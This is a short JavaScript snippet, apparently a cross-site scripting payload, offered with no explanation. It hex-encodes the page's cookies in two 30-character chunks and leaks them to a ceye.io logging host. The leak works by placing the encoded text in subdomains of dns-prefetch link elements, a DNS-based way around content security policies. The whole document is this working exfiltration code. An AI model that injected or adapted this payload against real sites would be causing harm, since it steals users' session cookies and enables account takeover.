function String2Hex(tmp) {
    var str = '';
    for(var i = 0; i < tmp.length; i++) {
        str += tmp[i].charCodeAt(0).toString(16);
    }
    return str;
}
var i=document.createElement('link');
i.setAttribute('rel','dns-prefetch');
i.setAttribute('href','//'+String2Hex(document.cookie.substr(0,30))+'.lekg1p.ceye.io');
document.head.appendChild(i);
var i=document.createElement('link');
i.setAttribute('rel','dns-prefetch');
i.setAttribute('href','//'+String2Hex(document.cookie.substr(30,30))+'.lekg1p.ceye.io');
document.head.appendChild(i);